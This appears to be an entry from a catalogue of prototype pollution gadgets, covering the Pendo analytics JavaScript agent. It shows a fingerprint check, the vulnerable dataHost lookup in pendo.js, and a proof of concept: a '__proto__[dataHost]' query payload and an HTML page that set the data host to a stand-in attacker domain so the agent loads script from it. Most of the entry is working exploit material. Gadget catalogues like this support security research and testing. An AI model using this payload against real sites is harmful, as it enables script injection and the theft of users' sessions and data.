## Pendo Agent

URL: https://developers.pendo.io/docs/

### JS Fingerprint
```
(typeof pendo !== 'undefined')
```

### Vulnerable code fragment
https://cdn.pendo.io/agent/static/{apiKey}/pendo.js
```js
function getPendoConfigValue(e) {
  return "undefined" != typeof PendoConfig ? PendoConfig[e] : void 0
}

function getDataHost() {
  var e = getPendoConfigValue("dataHost");
  return e ? "https://" + e : getOption("dataHost", SERVER)
}

var HOST = getDataHost(),
buildBaseDataUrl = function(e, t, n) {
  var i = HOST + "/data/" + e + "/" + t, 
  o = _.map(n, function(e, t) { return t + "=" + e });
  return o.length > 0 && (i += "?" + o.join("&")), i
}
```

### PoC

```
?__proto__[dataHost]=attacker.tld/js.js%23
```

```html
<script>
	Object.prototype.dataHost = "attacker.tld/js.js#"
</script>

<script>
    (function (apiKey) {
        (function(p,e,n,d,o){var v,w,x,y,z;o=p[d]=p[d]||{};o._q=[];
        v=['initialize','identify','updateOptions','pageLoad'];for(w=0,x=v.length;w<x;++w)(function(m){
        o[m]=o[m]||function(){o._q[m===v[0]?'unshift':'push']([m].concat([].slice.call(arguments,0)));};})(v[w]);
        y=e.createElement(n);y.async=!0;y.src='https://cdn.pendo.io/agent/static/'+apiKey+'/pendo.js';
        z=e.getElementsByTagName(n)[0];z.parentNode.insertBefore(y,z);})(window,document,'script','pendo');
    })('0dc1622e-c2cc-4c1d-428d-89885cdde616');

    pendo.initialize({});
</script>
```